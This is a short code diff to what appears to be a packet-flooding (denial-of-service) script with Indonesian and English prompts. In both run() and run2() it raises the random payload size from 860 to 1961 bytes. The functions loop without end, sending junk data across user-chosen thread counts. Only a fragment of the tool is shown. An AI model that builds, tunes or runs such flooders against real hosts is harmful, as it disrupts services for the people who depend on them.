@@ -27,7 +27,7 @@ choice = str(input("Gas?(y/n):"))
 times = int(input("Packet Berapa? | Packets:"))
 threads = int(input("Mau Berapa Lama? | Threads:"))
 def run():
-        data = random._urandom(860)
+        data = random._urandom(1961)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
@@ -39,7 +39,7 @@ def run():
                 except:
                         print("\033[94m Punten Goput, Yaaa gada orang ")
 def run2():
-        data = random._urandom(860)
+        data = random._urandom(1961)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
